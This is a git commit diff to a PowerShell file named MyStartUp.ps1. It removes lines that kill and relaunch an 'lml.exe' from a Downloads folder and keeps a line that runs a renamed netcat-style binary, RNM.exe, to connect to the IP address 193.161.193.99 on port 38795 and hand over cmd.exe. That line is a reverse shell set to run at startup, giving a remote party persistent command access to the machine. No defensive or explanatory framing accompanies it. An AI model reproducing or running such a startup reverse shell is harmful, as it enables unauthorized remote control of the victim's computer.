8c4d2720f8acfa7f551a7a2f33bfa2d8ce1337a9
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-07-13 01:51:02 +0200

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,3 +1,1 @@
-taskkill /F /IM lml.exe
-start "" "C:\Users\ALOOO\Downloads\lml.exe"
-C:\users\public\RNM.exe -nv 193.161.193.99 38795 -e cmd.exe 
+C:\users\public\RNM.exe -nv 193.161.193.99 38795 -e cmd.exe
